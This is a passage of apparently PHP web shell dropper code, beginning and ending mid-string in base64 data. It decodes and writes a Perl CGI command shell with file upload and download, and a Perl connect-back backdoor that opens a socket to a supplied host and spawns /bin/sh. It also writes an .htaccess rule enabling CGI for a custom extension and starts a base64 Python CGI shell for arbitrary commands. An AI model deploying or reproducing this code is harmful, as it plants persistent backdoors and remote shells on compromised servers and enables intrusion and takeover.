Fra1JHOTNibXh2WVdSTWFXNXJJRDBnSWlSVFkzSnBjSFJNYjJOaGRHbHZiajloUFdSdmQyNXNiMkZrCkptWTlKRVpwYkdWVmNtd21iejFuYnlJN0RRb0pDU1JJZEcxc1RXVjBZVWhsWVdSbGNpQTlJQ0k4YldWMFlTQklWRlJRTFVWUlZVbFcKUFZ3aVVtVm1jbVZ6YUZ3aUlFTlBUbFJGVGxROVhDSXhPeUJWVWt3OUpFUnZkMjVzYjJGa1RHbHVhMXdpUGlJN0RRb0pDU1pRY21sdQpkRkJoWjJWSVpXRmtaWElvSW1NaUtUc05DZ2tKY0hKcGJuUWdQRHhGVGtRN0RRbzhZMjlrWlQ0TkNnMEtVMlZ1WkdsdVp5QkdhV3hsCklDUlVjbUZ1YzJabGNrWnBiR1V1TGk0OFluSStEUXBKWmlCMGFHVWdaRzkzYm14dllXUWdaRzlsY3lCdWIzUWdjM1JoY25RZ1lYVjAKYjIxaGRHbGpZV3hzZVN3TkNqeGhJR2h5WldZOUlpUkViM2R1Ykc5aFpFeHBibXNpUGtOc2FXTnJJRWhsY21VOEwyRStMZzBLUlU1RQpEUW9KQ1NaUWNtbHVkRU52YlcxaGJtUk1hVzVsU1c1d2RYUkdiM0p0T3cwS0NRa21VSEpwYm5SUVlXZGxSbTl2ZEdWeU93MEtDWDBOCkNnbGxiSE5sSUNNZ1ptbHNaU0JrYjJWemJpZDBJR1Y0YVhOMERRb0pldzBLQ1FrbVVISnBiblJRWVdkbFNHVmhaR1Z5S0NKbUlpazcKRFFvSkNYQnlhVzUwSUNKR1lXbHNaV1FnZEc4Z1pHOTNibXh2WVdRZ0pFWnBiR1ZWY213NklDUWhJanNOQ2drSkpsQnlhVzUwUm1scwpaVVJ2ZDI1c2IyRmtSbTl5YlRzTkNna0pKbEJ5YVc1MFVHRm5aVVp2YjNSbGNqc05DZ2w5RFFwOURRb05DaU10TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwTkNpTWdWR2hwY3lCbWRXNWpkR2x2YmlCeVpXRmtjeUIwYUdVZ2MzQmxZMmxtYVdWa0lHWnBiR1VnWm5KdgpiU0IwYUdVZ1pHbHpheUJoYm1RZ2MyVnVaSE1nYVhRZ2RHOGdkR2hsRFFvaklHSnliM2R6WlhJc0lITnZJSFJvWVhRZ2FYUWdZMkZ1CklHSmxJR1J2ZDI1c2IyRmtaV1FnWW5rZ2RHaGxJSFZ6WlhJdURRb2pJRUZ5WjNWdFpXNTBJREU2SUVaMWJHeDVJSEYxWVd4cFptbGwKWkNCd1lYUm9ibUZ0WlNCdlppQjBhR1VnWm1sc1pTQjBieUJpWlNCelpXNTBMZzBLSXkwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxRMEtjM1ZpSUZObGJtUkdhV3hsVkc5Q2NtOTNjMlZ5RFFwN0RRb0piRzlqWVd3b0pGTmxibVJHYVd4bEtTQTlJRUJmT3cwS0NXbG0KS0c5d1pXNG9VMFZPUkVaSlRFVXNJQ1JUWlc1a1JtbHNaU2twSUNNZ1ptbHNaU0J2Y0dWdVpXUWdabTl5SUhKbFlXUnBibWNOQ2dsNwpEUW9KQ1dsbUtDUlhhVzVPVkNrTkNna0pldzBLQ1FrSlltbHViVzlrWlNoVFJVNUVSa2xNUlNrN0RRb0pDUWxpYVc1dGIyUmxLRk5VClJFOVZWQ2s3RFFvSkNYME5DZ2tKSkVacGJHVlRhWHBsSUQwZ0tITjBZWFFvSkZObGJtUkdhV3hsS1NsYk4xMDdEUW9KQ1Nna1JtbHMKWlc1aGJXVWdQU0FrVTJWdVpFWnBiR1VwSUQxK0lDQnRJU2hiWGk5ZVhGeGRLaWtrSVRzTkNna0pjSEpwYm5RZ0lrTnZiblJsYm5RdApWSGx3WlRvZ1lYQndiR2xqWVhScGIyNHZlQzExYm10dWIzZHVYRzRpT3cwS0NRbHdjbWx1ZENBaVEyOXVkR1Z1ZEMxTVpXNW5kR2c2CklDUkdhV3hsVTJsNlpWeHVJanNOQ2drSmNISnBiblFnSWtOdmJuUmxiblF0UkdsemNHOXphWFJwYjI0NklHRjBkR0ZqYUcxbGJuUTcKSUdacGJHVnVZVzFsUFNReFhHNWNiaUk3RFFvSkNYQnlhVzUwSUhkb2FXeGxLRHhUUlU1RVJrbE1SVDRwT3cwS0NRbGpiRzl6WlNoVApSVTVFUmtsTVJTazdEUW9KZlEwS0NXVnNjMlVnSXlCbVlXbHNaV1FnZEc4Z2IzQmxiaUJtYVd4bERRb0pldzBLQ1FrbVVISnBiblJRCllXZGxTR1ZoWkdWeUtDSm1JaWs3RFFvSkNYQnlhVzUwSUNKR1lXbHNaV1FnZEc4Z1pHOTNibXh2WVdRZ0pGTmxibVJHYVd4bE9pQWsKSVNJN0RRb0pDU1pRY21sdWRFWnBiR1ZFYjNkdWJHOWhaRVp2Y20wN0RRb05DZ2tKSmxCeWFXNTBVR0ZuWlVadmIzUmxjanNOQ2dsOQpEUXA5RFFvTkNnMEtJeTB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUTBLSXlCVWFHbHpJR1oxYm1OMGFXOXVJR2x6SUdOaGJHeGwKWkNCM2FHVnVJSFJvWlNCMWMyVnlJR1J2ZDI1c2IyRmtjeUJoSUdacGJHVXVJRWwwSUdScGMzQnNZWGx6SUdFZ2JXVnpjMkZuWlEwSwpJeUIwYnlCMGFHVWdkWE5sY2lCaGJtUWdjSEp2ZG1sa1pYTWdZU0JzYVc1cklIUm9jbTkxWjJnZ2QyaHBZMmdnZEdobElHWnBiR1VnClkyRnVJR0psSUdSdmQyNXNiMkZrWldRdURRb2pJRlJvYVhNZ1puVnVZM1JwYjI0Z2FYTWdZV3h6YnlCallXeHNaV1FnZDJobGJpQjAKYUdVZ2RYTmxjaUJqYkdsamEzTWdiMjRnZEdoaGRDQnNhVzVyTGlCSmJpQjBhR2x6SUdOaGMyVXNEUW9qSUhSb1pTQm1hV3hsSUdsegpJSEpsWVdRZ1lXNWtJSE5sYm5RZ2RHOGdkR2hsSUdKeWIzZHpaWEl1RFFvakxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdERRcHoKZFdJZ1FtVm5hVzVFYjNkdWJHOWhaQTBLZXcwS0NTTWdaMlYwSUdaMWJHeDVJSEYxWVd4cFptbGxaQ0J3WVhSb0lHOW1JSFJvWlNCbQphV3hsSUhSdklHSmxJR1J2ZDI1c2IyRmtaV1FOQ2dscFppZ29KRmRwYms1VUlDWWdLQ1JVY21GdWMyWmxja1pwYkdVZ1BYNGdiUzllClhGeDhYaTQ2THlrcElId05DZ2tKS0NFa1YybHVUbFFnSmlBb0pGUnlZVzV6Wm1WeVJtbHNaU0E5ZmlCdEwxNWNMeThwS1NrZ0l5QncKWVhSb0lHbHpJR0ZpYzI5c2RYUmxEUW9KZXcwS0NRa2tWR0Z5WjJWMFJtbHNaU0E5SUNSVWNtRnVjMlpsY2tacGJHVTdEUW9KZlEwSwpDV1ZzYzJVZ0l5QndZWFJvSUdseklISmxiR0YwYVhabERRb0pldzBLQ1FsamFHOXdLQ1JVWVhKblpYUkdhV3hsS1NCcFppZ2tWR0Z5CloyVjBSbWxzWlNBOUlDUkRkWEp5Wlc1MFJHbHlLU0E5ZmlCdEwxdGNYRnd2WFNRdk93MEtDUWtrVkdGeVoyVjBSbWxzWlNBdVBTQWsKVUdGMGFGTmxjQzRrVkhKaGJuTm1aWEpHYVd4bE93MEtDWDBOQ2cwS0NXbG1LQ1JQY0hScGIyNXpJR1Z4SUNKbmJ5SXBJQ01nZDJVZwphR0YyWlNCMGJ5QnpaVzVrSUhSb1pTQm1hV3hsRFFvSmV3MEtDUWttVTJWdVpFWnBiR1ZVYjBKeWIzZHpaWElvSkZSaGNtZGxkRVpwCmJHVXBPdzBLQ1gwTkNnbGxiSE5sSUNNZ2QyVWdhR0YyWlNCMGJ5QnpaVzVrSUc5dWJIa2dkR2hsSUd4cGJtc2djR0ZuWlEwS0NYc04KQ2drSkpsQnlhVzUwUkc5M2JteHZZV1JNYVc1clVHRm5aU2drVkdGeVoyVjBSbWxzWlNrN0RRb0pmUTBLZlEwS0RRb2pMUzB0TFMwdApMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0RFFvaklGUm9hWE1nWm5WdVkzUnBiMjRnYVhNZ1kyRnNiR1ZrSUhkb1pXNGdkR2hsSUhWelpYSWcKZDJGdWRITWdkRzhnZFhCc2IyRmtJR0VnWm1sc1pTNGdTV1lnZEdobERRb2pJR1pwYkdVZ2FYTWdibTkwSUhOd1pXTnBabWxsWkN3ZwphWFFnWkdsemNHeGhlWE1nWVNCbWIzSnRJR0ZzYkc5M2FXNW5JSFJvWlNCMWMyVnlJSFJ2SUhOd1pXTnBabmtnWVEwS0l5Qm1hV3hsCkxDQnZkR2hsY25kcGMyVWdhWFFnYzNSaGNuUnpJSFJvWlNCMWNHeHZZV1FnY0hKdlkyVnpjeTROQ2lNdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTME5Dbk4xWWlCVmNHeHZZV1JHYVd4bERRcDdEUW9KSXlCcFppQnVieUJtYVd4bElHbHpJSE53WldOcFptbGxaQ3dnCmNISnBiblFnZEdobElIVndiRzloWkNCbWIzSnRJR0ZuWVdsdURRb0phV1lvSkZSeVlXNXpabVZ5Um1sc1pTQmxjU0FpSWlrTkNnbDcKRFFvSkNTWlFjbWx1ZEZCaFoyVklaV0ZrWlhJb0ltWWlLVHNOQ2drSkpsQnlhVzUwUm1sc1pWVndiRzloWkVadmNtMDdEUW9KQ1NaUQpjbWx1ZEZCaFoyVkdiMjkwWlhJN0RRb0pDWEpsZEhWeWJqc05DZ2w5RFFvSkpsQnlhVzUwVUdGblpVaGxZV1JsY2lnaVl5SXBPdzBLCkRRb0pJeUJ6ZEdGeWRDQjBhR1VnZFhCc2IyRmthVzVuSUhCeWIyTmxjM01OQ2dsd2NtbHVkQ0FpVlhCc2IyRmthVzVuSUNSVWNtRnUKYzJabGNrWnBiR1VnZEc4Z0pFTjFjbkpsYm5SRWFYSXVMaTQ4WW5JK0lqc05DZzBLQ1NNZ1oyVjBJSFJvWlNCbWRXeHNiSGtnY1hWaApiR2xtYVdWa0lIQmhkR2h1WVcxbElHOW1JSFJvWlNCbWFXeGxJSFJ2SUdKbElHTnlaV0YwWldRTkNnbGphRzl3S0NSVVlYSm5aWFJPCllXMWxLU0JwWmlBb0pGUmhjbWRsZEU1aGJXVWdQU0FrUTNWeWNtVnVkRVJwY2lrZ1BYNGdiUzliWEZ4Y0wxMGtMenNOQ2dra1ZISmgKYm5ObVpYSkdhV3hsSUQxK0lHMGhLRnRlTDE1Y1hGMHFLU1FoT3cwS0NTUlVZWEpuWlhST1lXMWxJQzQ5SUNSUVlYUm9VMlZ3TGlReApPdzBLRFFvSkpGUmhjbWRsZEVacGJHVlRhWHBsSUQwZ2JHVnVaM1JvS0NScGJuc25abWxzWldSaGRHRW5mU2s3RFFvSkl5QnBaaUIwCmFHVWdabWxzWlNCbGVHbHpkSE1nWVc1a0lIZGxJR0Z5WlNCdWIzUWdjM1Z3Y0c5elpXUWdkRzhnYjNabGNuZHlhWFJsSUdsMERRb0oKYVdZb0xXVWdKRlJoY21kbGRFNWhiV1VnSmlZZ0pFOXdkR2x2Ym5NZ2JtVWdJbTkyWlhKM2NtbDBaU0lwRFFvSmV3MEtDUWx3Y21sdQpkQ0FpUm1GcGJHVmtPaUJFWlhOMGFXNWhkR2x2YmlCbWFXeGxJR0ZzY21WaFpIa2daWGhwYzNSekxqeGljajRpT3cwS0NYME5DZ2xsCmJITmxJQ01nWm1sc1pTQnBjeUJ1YjNRZ2NISmxjMlZ1ZEEwS0NYc05DZ2tKYVdZb2IzQmxiaWhWVUV4UFFVUkdTVXhGTENBaVBpUlUKWVhKblpYUk9ZVzFsSWlrcERRb0pDWHNOQ2drSkNXSnBibTF2WkdVb1ZWQk1UMEZFUmtsTVJTa2dhV1lnSkZkcGJrNVVPdzBLQ1FrSgpjSEpwYm5RZ1ZWQk1UMEZFUmtsTVJTQWthVzU3SjJacGJHVmtZWFJoSjMwN0RRb0pDUWxqYkc5elpTaFZVRXhQUVVSR1NVeEZLVHNOCkNna0pDWEJ5YVc1MElDSlVjbUZ1YzJabGNtVmtJQ1JVWVhKblpYUkdhV3hsVTJsNlpTQkNlWFJsY3k0OFluSStJanNOQ2drSkNYQnkKYVc1MElDSkdhV3hsSUZCaGRHZzZJQ1JVWVhKblpYUk9ZVzFsUEdKeVBpSTdEUW9KQ1gwTkNna0paV3h6WlEwS0NRbDdEUW9KQ1FsdwpjbWx1ZENBaVJtRnBiR1ZrT2lBa0lUeGljajRpT3cwS0NRbDlEUW9KZlEwS0NYQnlhVzUwSUNJaU93MEtDU1pRY21sdWRFTnZiVzFoCmJtUk1hVzVsU1c1d2RYUkdiM0p0T3cwS0RRb0pKbEJ5YVc1MFVHRm5aVVp2YjNSbGNqc05DbjBOQ2cwS0l5MHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTMHRMUTBLSXlCVWFHbHpJR1oxYm1OMGFXOXVJR2x6SUdOaGJHeGxaQ0IzYUdWdUlIUm9aU0IxYzJWeUlIZGhiblJ6CklIUnZJR1J2ZDI1c2IyRmtJR0VnWm1sc1pTNGdTV1lnZEdobERRb2pJR1pwYkdWdVlXMWxJR2x6SUc1dmRDQnpjR1ZqYVdacFpXUXMKSUdsMElHUnBjM0JzWVhseklHRWdabTl5YlNCaGJHeHZkMmx1WnlCMGFHVWdkWE5sY2lCMGJ5QnpjR1ZqYVdaNUlHRU5DaU1nWm1scwpaU3dnYjNSb1pYSjNhWE5sSUdsMElHUnBjM0JzWVhseklHRWdiV1Z6YzJGblpTQjBieUIwYUdVZ2RYTmxjaUJoYm1RZ2NISnZkbWxrClpYTWdZU0JzYVc1ckRRb2pJSFJvY205MVoyZ2dJSGRvYVdOb0lIUm9aU0JtYVd4bElHTmhiaUJpWlNCa2IzZHViRzloWkdWa0xnMEsKSXkwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFEwS2MzVmlJRVJ2ZDI1c2IyRmtSbWxzWlEwS2V3MEtDU01nYVdZZ2JtOGdabWxzClpTQnBjeUJ6Y0dWamFXWnBaV1FzSUhCeWFXNTBJSFJvWlNCa2IzZHViRzloWkNCbWIzSnRJR0ZuWVdsdURRb0phV1lvSkZSeVlXNXoKWm1WeVJtbHNaU0JsY1NBaUlpa05DZ2w3RFFvSkNTWlFjbWx1ZEZCaFoyVklaV0ZrWlhJb0ltWWlLVHNOQ2drSkpsQnlhVzUwUm1scwpaVVJ2ZDI1c2IyRmtSbTl5YlRzTkNna0pKbEJ5YVc1MFVHRm5aVVp2YjNSbGNqc05DZ2tKY21WMGRYSnVPdzBLQ1gwTkNna05DZ2tqCklHZGxkQ0JtZFd4c2VTQnhkV0ZzYVdacFpXUWdjR0YwYUNCdlppQjBhR1VnWm1sc1pTQjBieUJpWlNCa2IzZHViRzloWkdWa0RRb0oKYVdZb0tDUlhhVzVPVkNBbUlDZ2tWSEpoYm5ObVpYSkdhV3hsSUQxK0lHMHZYbHhjZkY0dU9pOHBLU0I4RFFvSkNTZ2hKRmRwYms1VQpJQ1lnS0NSVWNtRnVjMlpsY2tacGJHVWdQWDRnYlM5ZVhDOHZLU2twSUNNZ2NHRjBhQ0JwY3lCaFluTnZiSFYwWlEwS0NYc05DZ2tKCkpGUmhjbWRsZEVacGJHVWdQU0FrVkhKaGJuTm1aWEpHYVd4bE93MEtDWDBOQ2dsbGJITmxJQ01nY0dGMGFDQnBjeUJ5Wld4aGRHbDIKWlEwS0NYc05DZ2tKWTJodmNDZ2tWR0Z5WjJWMFJtbHNaU2tnYVdZb0pGUmhjbWRsZEVacGJHVWdQU0FrUTNWeWNtVnVkRVJwY2lrZwpQWDRnYlM5YlhGeGNMMTBrTHpzTkNna0pKRlJoY21kbGRFWnBiR1VnTGowZ0pGQmhkR2hUWlhBdUpGUnlZVzV6Wm1WeVJtbHNaVHNOCkNnbDlEUW9OQ2dscFppZ2tUM0IwYVc5dWN5QmxjU0FpWjI4aUtTQWpJSGRsSUdoaGRtVWdkRzhnYzJWdVpDQjBhR1VnWm1sc1pRMEsKQ1hzTkNna0pKbE5sYm1SR2FXeGxWRzlDY205M2MyVnlLQ1JVWVhKblpYUkdhV3hsS1RzTkNnbDlEUW9KWld4elpTQWpJSGRsSUdoaApkbVVnZEc4Z2MyVnVaQ0J2Ym14NUlIUm9aU0JzYVc1cklIQmhaMlVOQ2dsN0RRb0pDU1pRY21sdWRFUnZkMjVzYjJGa1RHbHVhMUJoCloyVW9KRlJoY21kbGRFWnBiR1VwT3cwS0NYME5DbjBOQ2cwS0l5MHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExRMEtJeUJOWVdsdQpJRkJ5YjJkeVlXMGdMU0JGZUdWamRYUnBiMjRnVTNSaGNuUnpJRWhsY21VTkNpTXRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTME4KQ2laU1pXRmtVR0Z5YzJVN0RRb21SMlYwUTI5dmEybGxjenNOQ2cwS0pGTmpjbWx3ZEV4dlkyRjBhVzl1SUQwZ0pFVk9WbnNuVTBOUwpTVkJVWDA1QlRVVW5mVHNOQ2lSVFpYSjJaWEpPWVcxbElEMGdKRVZPVm5zblUwVlNWa1ZTWDA1QlRVVW5mVHNOQ2lSTWIyZHBibEJoCmMzTjNiM0prSUQwZ0pHbHVleWR3SjMwN0RRb2tVblZ1UTI5dGJXRnVaQ0E5SUNScGJuc25ZeWQ5T3cwS0pGUnlZVzV6Wm1WeVJtbHMKWlNBOUlDUnBibnNuWmlkOU93MEtKRTl3ZEdsdmJuTWdQU0FrYVc1N0oyOG5mVHNOQ2cwS0pFRmpkR2x2YmlBOUlDUnBibnNuWVNkOQpPdzBLSkVGamRHbHZiaUE5SUNKc2IyZHBiaUlnYVdZb0pFRmpkR2x2YmlCbGNTQWlJaWs3SUNNZ2JtOGdZV04wYVc5dUlITndaV05wClptbGxaQ3dnZFhObElHUmxabUYxYkhRTkNnMEtJeUJuWlhRZ2RHaGxJR1JwY21WamRHOXllU0JwYmlCM2FHbGphQ0IwYUdVZ1kyOXQKYldGdVpITWdkMmxzYkNCaVpTQmxlR1ZqZFhSbFpBMEtKRU4xY25KbGJuUkVhWElnUFNBa2FXNTdKMlFuZlRzTkNtTm9iM0FvSkVOMQpjbkpsYm5SRWFYSWdQU0JnSkVOdFpGQjNaR0FwSUdsbUtDUkRkWEp5Wlc1MFJHbHlJR1Z4SUNJaUtUc05DZzBLSkV4dloyZGxaRWx1CklEMGdKRU52YjJ0cFpYTjdKMU5CVmtWRVVGZEVKMzBnWlhFZ0pGQmhjM04zYjNKa093MEtEUXBwWmlna1FXTjBhVzl1SUdWeElDSnMKYjJkcGJpSWdmSHdnSVNSTWIyZG5aV1JKYmlrZ0l5QjFjMlZ5SUc1bFpXUnpMMmhoY3lCMGJ5QnNiMmRwYmcwS2V3MEtDU1pRWlhKbQpiM0p0VEc5bmFXNDdEUW9OQ24wTkNtVnNjMmxtS0NSQlkzUnBiMjRnWlhFZ0ltTnZiVzFoYm1RaUtTQWpJSFZ6WlhJZ2QyRnVkSE1nCmRHOGdjblZ1SUdFZ1kyOXRiV0Z1WkEwS2V3MEtDU1pGZUdWamRYUmxRMjl0YldGdVpEc05DbjBOQ21Wc2MybG1LQ1JCWTNScGIyNGcKWlhFZ0luVndiRzloWkNJcElDTWdkWE5sY2lCM1lXNTBjeUIwYnlCMWNHeHZZV1FnWVNCbWFXeGxEUXA3RFFvSkpsVndiRzloWkVacApiR1U3RFFwOURRcGxiSE5wWmlna1FXTjBhVzl1SUdWeElDSmtiM2R1Ykc5aFpDSXBJQ01nZFhObGNpQjNZVzUwY3lCMGJ5QmtiM2R1CmJHOWhaQ0JoSUdacGJHVU5DbnNOQ2drbVJHOTNibXh2WVdSR2FXeGxPdzBLZlEwS1pXeHphV1lvSkVGamRHbHZiaUJsY1NBaWJHOW4KYjNWMElpa2dJeUIxYzJWeUlIZGhiblJ6SUhSdklHeHZaMjkxZEEwS2V3MEtDU1pRWlhKbWIzSnRURzluYjNWME93MEtmUT09JzsKCiRmaWxlID0gZm9wZW4oIml6by5jaW4iICwidysiKTsKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkY2dpc2hlbGxpem9jaW4pKTsKZmNsb3NlKCRmaWxlKTsKICAgIGNobW9kKCJpem8uY2luIiwwNzU1KTsKJG5ldGNhdHNoZWxsID0gJ0l5RXZkWE55TDJKcGJpOXdaWEpzRFFvZ0lDQWdJQ0IxYzJVZ1UyOWphMlYwT3cwS0lDQWdJQ0FnY0hKcGJuUWdJa1JoZEdFZ1EyaGgKTUhNZ1EyOXVibVZqZENCQ1lXTnJJRUpoWTJ0a2IyOXlYRzVjYmlJN0RRb2dJQ0FnSUNCcFppQW9JU1JCVWtkV1d6QmRLU0I3RFFvZwpJQ0FnSUNBZ0lIQnlhVzUwWmlBaVZYTmhaMlU2SUNRd0lGdEliM04wWFNBOFVHOXlkRDVjYmlJN0RRb2dJQ0FnSUNBZ0lHVjRhWFFvCk1TazdEUW9nSUNBZ0lDQjlEUW9nSUNBZ0lDQndjbWx1ZENBaVd5cGRJRVIxYlhCcGJtY2dRWEpuZFcxbGJuUnpYRzRpT3cwS0lDQWcKSUNBZ0pHaHZjM1FnUFNBa1FWSkhWbHN3WFRzTkNpQWdJQ0FnSUNSd2IzSjBJRDBnT0RBN0RRb2dJQ0FnSUNCcFppQW9KRUZTUjFaYgpNVjBwSUhzTkNpQWdJQ0FnSUNBZ0pIQnZjblFnUFNBa1FWSkhWbHN4WFRzTkNpQWdJQ0FnSUgwTkNpQWdJQ0FnSUhCeWFXNTBJQ0piCktsMGdRMjl1Ym1WamRHbHVaeTR1TGx4dUlqc05DaUFnSUNBZ0lDUndjbTkwYnlBOUlHZGxkSEJ5YjNSdllubHVZVzFsS0NkMFkzQW4KS1NCOGZDQmthV1VvSWxWdWEyNXZkMjRnVUhKdmRHOWpiMnhjYmlJcE93MEtJQ0FnSUNBZ2MyOWphMlYwS0ZORlVsWkZVaXdnVUVaZgpTVTVGVkN3Z1UwOURTMTlUVkZKRlFVMHNJQ1J3Y205MGJ5a2dmSHdnWkdsbElDZ2lVMjlqYTJWMElFVnljbTl5WEc0aUtUc05DaUFnCklDQWdJRzE1SUNSMFlYSm5aWFFnUFNCcGJtVjBYMkYwYjI0b0pHaHZjM1FwT3cwS0lDQWdJQ0FnYVdZZ0tDRmpiMjV1WldOMEtGTkYKVWxaRlVpd2djR0ZqYXlBaVUyNUJOSGc0SWl3Z01pd2dKSEJ2Y25Rc0lDUjBZWEpuWlhRcEtTQjdEUW9nSUNBZ0lDQWdJR1JwWlNnaQpWVzVoWW14bElIUnZJRU52Ym01bFkzUmNiaUlwT3cwS0lDQWdJQ0FnZlEwS0lDQWdJQ0FnY0hKcGJuUWdJbHNxWFNCVGNHRjNibWx1Clp5QlRhR1ZzYkZ4dUlqc05DaUFnSUNBZ0lHbG1JQ2doWm05eWF5Z2dLU2tnZXcwS0lDQWdJQ0FnSUNCdmNHVnVLRk5VUkVsT0xDSSsKSmxORlVsWkZVaUlwT3cwS0lDQWdJQ0FnSUNCdmNHVnVLRk5VUkU5VlZDd2lQaVpUUlZKV1JWSWlLVHNOQ2lBZ0lDQWdJQ0FnYjNCbApiaWhUVkVSRlVsSXNJajRtVTBWU1ZrVlNJaWs3RFFvZ0lDQWdJQ0FnSUdWNFpXTWdleWN2WW1sdUwzTm9KMzBnSnkxaVlYTm9KeUF1CklDSmNNQ0lnZUNBME93MEtJQ0FnSUNBZ0lDQmxlR2wwS0RBcE93MEtJQ0FnSUNBZ2ZRMEtJQ0FnSUNBZ2NISnBiblFnSWxzcVhTQkUKWVhSaFkyaGxaRnh1WEc0aU93PT0nOwoKJGZpbGUgPSBmb3BlbigiZGMucGwiICwidysiKTsKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkbmV0Y2F0c2hlbGwpKTsKZmNsb3NlKCRmaWxlKTsKICAgIGNobW9kKCJkYy5wbCIsMDc1NSk7CmVjaG8gIjxpZnJhbWUgc3JjPWNnaXNoZWxsL2l6by5jaW4gd2lkdGg9MTAwJSBoZWlnaHQ9MTAwJSBmcmFtZWJvcmRlcj0wPjwvaWZyYW1lPiAiOwp9CmlmIChpc3NldCgkX1BPU1RbJ1N1Ym1pdDE0J10pKQp7CiAgICBta2RpcigncHl0aG9uJywgMDc1NSk7CiAgICBjaGRpcigncHl0aG9uJyk7CiAgICAgICAgJGtva2Rvc3lhID0gIi5odGFjY2VzcyI7CiAgICAgICAgJGRvc3lhX2FkaSA9ICIka29rZG9zeWEiOwogICAgICAgICRkb3N5YSA9IGZvcGVuICgkZG9zeWFfYWRpICwgJ3cnKSBvciBkaWUgKCJEb3N5YSBhw6fEsWxhbWFkxLEhIik7CiAgICAgICAgJG1ldGluID0gIkFkZEhhbmRsZXIgY2dpLXNjcmlwdCAuaXpvIjsgICAgCiAgICAgICAgZndyaXRlICggJGRvc3lhICwgJG1ldGluICkgOwogICAgICAgIGZjbG9zZSAoJGRvc3lhKTsKJHB5dGhvbnAgPSAnSXlFdmRYTnlMMkpwYmk5d2VYUm9iMjRLSXlBd055MHdOeTB3TkFvaklIWXhMakF1TUFvS0l5QmpaMmt0YzJobGJHd3VjSGtLSXlCQgpJSE5wYlhCc1pTQkRSMGtnZEdoaGRDQmxlR1ZqZFhSbGN5QmhjbUpwZEhKaGNua2djMmhsYkd3Z1kyOXRiV0Z1WkhNdUNnb0tJeUJECmIzQjVjbWxuYUhRZ1RXbGphR0ZsYkNCR2IyOXlaQW9qSUZsdmRTQmhjbVVnWm5KbFpTQjBieUJ0YjJScFpua3NJSFZ6WlNCaGJtUWcKY21Wc2FXTmxibk5sSUhSb2FYTWdZMjlrWlM0S0NpTWdUbThnZDJGeWNtRnVkSGtnWlhod2NtVnpjeUJ2Y2lCcGJYQnNhV1ZrSUdadgpjaUIwYUdVZ1lXTmpkWEpoWTNrc0lHWnBkRzVsYzNNZ2RHOGdjSFZ5Y0c5elpTQnZjaUJ2ZEdobGNuZHBjMlVnWm05eUlIUm9hWE1nClkyOWtaUzR1TGk0S0l5QlZjMlVnWVhRZ2VXOTFjaUJ2ZDI0Z2NtbHpheUFoSVNFS0NpTWdSUzF0WVdsc0lHMXBZMmhoWld3Z1FWUWcKWm05dmNtUWdSRTlVSUcxbElFUlBWQ0IxYXdvaklFMWhhVzUwWVdsdVpXUWdZWFFnZDNkM0xuWnZhV1J6Y0dGalpTNXZjbWN1ZFdzdgpZWFJzWVc1MGFXSnZkSE12Y0hsMGFHOXVkWFJwYkhNdWFIUnRiQW9LSWlJaUNrRWdjMmx0Y0d4bElFTkhTU0J6WTNKcGNIUWdkRzhnClpYaGxZM1YwWlNCemFHVnNiQ0JqYjIxdFlXNWtjeUIyYVdFZ1EwZEpMZ29pSWlJS0l5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWoKSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJd29qSUVsdGNHOXlkSE1LZEhKNQpPZ29nSUNBZ2FXMXdiM0owSUdObmFYUmlPeUJqWjJsMFlpNWxibUZpYkdVb0tRcGxlR05sY0hRNkNpQWdJQ0J3WVhOekNtbHRjRzl5CmRDQnplWE1zSUdObmFTd2diM01LYzNsekxuTjBaR1Z5Y2lBOUlITjVjeTV6ZEdSdmRYUUtabkp2YlNCMGFXMWxJR2x0Y0c5eWRDQnoKZEhKbWRHbHRaUXBwYlhCdmNuUWdkSEpoWTJWaVlXTnJDbVp5YjIwZ1UzUnlhVzVuU1U4Z2FXMX